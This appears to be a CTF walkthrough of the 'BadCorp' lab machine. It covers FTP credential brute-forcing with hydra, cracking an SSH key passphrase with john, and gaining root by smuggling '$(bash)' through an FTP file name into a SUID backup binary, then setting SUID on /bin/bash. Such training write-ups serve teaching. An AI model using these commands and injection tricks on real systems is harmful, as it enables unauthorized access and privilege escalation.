# BadCorp

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.160.133
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 13:28 +08
Nmap scan report for 192.168.160.133
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Web Enumeration

The website was a corporate website:

<figure><img src="../../../.gitbook/assets/image (3956).png" alt=""><figcaption></figcaption></figure>

First thing I noticed was the **phone numbers**. Normally machines, I see numbers like +12 345 678. This was the first box I saw that included unique phone numbers. I took a look at their team:

<figure><img src="../../../.gitbook/assets/image (3878).png" alt=""><figcaption></figcaption></figure>

Again, phone numbers are unique here. This made me think about every little detail in the website, including the names of the users.&#x20;

There wasn't much more on the website, and we were just left with FTP and SSH.

### FTP Brute Force --> SSH Key

I took a look at this tweet regarding BadCorp:

{% embed url="https://twitter.com/offsectraining/status/1370149035059859459?lang=en" %}

To me, the 'insignificant information' was probably from the website. As such, I constructed wordlists based on the names of users and their phone numbers like this.

```
$ python2 username.py -n 'david williams' > user_word
$ cat pass_word                            
+23-34512435
2334512435
34512435
```

I then brute forced the FTP using `hydra` for each user and phone number, and eventually found one set of credentials that worked:

```
$ hydra -L user_word -P pass_word ftp://192.168.160.133
[21][ftp] host: 192.168.160.133   login: hoswald   password: 34566550
```

We can then login to FTP:

```
$ ftp 192.168.160.133                         
Connected to 192.168.160.133.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 6 of 50 allowed.
220-Local time is now 00:40. Server port: 21.
220-This is a private system - No anonymous login
220 You will be disconnected after 15 minutes of inactivity.
Name (192.168.160.133:kali): hoswald 
331 User hoswald OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 PORT command successful
150 Connecting to port 50225
-rwxrwxr--    1 0          0                1766 Feb 24  2021 id_rsa
226-Options: -l 
226 1 matches total
```

This file was password encrypted:

```
$ cat id_rsa                   
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,689C848171117DE40F9DDDC1059582EC
```

We can crack this using `ssh2john.py` and `john`:

```
$ ssh2john id_rsa > ssh.john
$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
developer        (id_rsa)     
1g 0:00:00:00 DONE (2023-07-13 13:42) 25.00g/s 3754Kp/s 3754Kc/s 3754KC/s dewthedew..derbeder
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<figure><img src="../../../.gitbook/assets/image (1178).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Backup SUID --> Reverse Engineering

I searched for SUID binaries within the machine and found one that stood out:

{% code overflow="wrap" %}
```
hoswald@badcorp:~$ find / -perm -u=s -type f  2>/dev/null
/usr/local/bin/backup
hoswald@badcorp:~$ file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=bef7543cc2b4b67931b5b549440ba5d76270edac, not stripped
hoswald@badcorp:~$ /usr/local/bin/backup
USAGE: backup <password> 
hoswald@badcorp:~$ /usr/local/bin/backup test
Wrong Password !!!
```
{% endcode %}

I didn't recognise this `backup` binary, so I downloaded it back to my machine and opened it up in `ghidra`.&#x20;

### Ghidra + Ltrace --> Command Injection

I first ran the binary with `ltrace`:

```
$ ltrace ./backup id
setuid(0)                                                = -1
strstr("id", "..")                                       = nil
strstr("id", "/")                                        = nil
strstr("id", "|")                                        = nil
strstr("id", "<")                                        = nil
strstr("id", ">")                                        = nil
strstr("id", "&")                                        = nil
strstr("id", " ")                                        = nil
strstr("id", "'")                                        = nil
strstr("id", "-")                                        = nil
strstr("id", "%")                                        = nil
strncpy(0x7fff99859cae, "id", 9)                         = 0x7fff99859cae
strcmp("eh\f\f\f\f\f\f", "|8\177\177{<~:")               = -23
puts("Wrong Password !!!"Wrong Password !!!
)                               = 19
+++ exited (status 0) +++
```

So it first makes us `root` and then checks for characters present. Afterwards, a basic `strcmp` is used to verify the password. The check for special characters seems to be a check for the bad characters:

```
$ ltrace ./backup '|8\177\177{<~:'
setuid(0)                                                = -1
strstr("|8\\177\\177{<~:", "..")                         = nil
strstr("|8\\177\\177{<~:", "/")                          = nil
strstr("|8\\177\\177{<~:", "|")                          = "|8\\177\\177{<~:"
puts("Bad character found !"Bad character found !
)                            = 22
strncpy(0x7ffe3e91560e, "|8\\177\\17", 9)                = 0x7ffe3e91560e
strcmp("p4P=;;P=7", "|8\177\177{<~:")                    = -12
puts("Wrong Password !!!"Wrong Password !!!
)                               = 19
+++ exited (status 0) +++
```

The bad characters don't include '$' and '()', opening up the possibility of command injection. Moving to `ghidra`, this binary prompts for a password before running the `check()` function to see if the password is correct, and then `copy()` if it is right:

<figure><img src="../../../.gitbook/assets/image (3484).png" alt=""><figcaption></figcaption></figure>

The `copy()` function takes an encrypted password and XOR's it with `0xc`:

<figure><img src="../../../.gitbook/assets/image (3482).png" alt=""><figcaption></figcaption></figure>

We can first grab the `pw` global variable from the binary:

<figure><img src="../../../.gitbook/assets/image (3116).png" alt=""><figcaption></figcaption></figure>

And then we can create a script in Python to decrypt this.&#x20;

```python
#!/usr/bin/python3
passwd = ''
cipher = bytes([0x3a, 0x7e, 0x3c, 0x7b, 0x7f, 0x7f, 0x38, 0x7c, 0x72])
b = bytes([0xc])
for x in reversed(cipher):
	ans = (x^0xc)
	passwd += chr(ans)

print (passwd)

$ python3 decrypt.py       
~p4ssw0r6
```

The first `~` character is not needed. We can then run the binary with the password:

```
hoswald@badcorp:~$ /usr/local/bin/backup p4ssw0r6
Create destination directory
FILE  id_rsa
ALL FILE COPYED IN /var/logs/hoswald/
```

We can move on to the `copy()` function now:

<figure><img src="../../../.gitbook/assets/image (1315).png" alt=""><figcaption></figcaption></figure>

All the binaries use their full path values, so no path hijacks here. However, this seems to use directories within `/var/logs` and `/home/FTP`. I was already thinking of command injection using subshells, and it seems that this is the exploit needed.&#x20;

We can use FTP to a few malicious files since we don't have write access over those directories:

```
ftp> put $(id)
local: $(id) remote: $(id)
229 Extended Passive mode OK (|||65519|)
150 Accepted data connection
     0        0.00 KiB/s 
226 File successfully transferred
```

This works!

<figure><img src="../../../.gitbook/assets/image (3716).png" alt=""><figcaption></figcaption></figure>

I then placed a file named `$(bash)` within the FTP directory, and it gave me a shell:

<figure><img src="../../../.gitbook/assets/image (3939).png" alt=""><figcaption></figcaption></figure>

This shell was pretty limited and couldn't give me any output. However, we can simply run `chmod u+s /bin/bash`. In another shell, we can then get a proper `root` shell easily:

<figure><img src="../../../.gitbook/assets/image (3491).png" alt=""><figcaption></figcaption></figure>
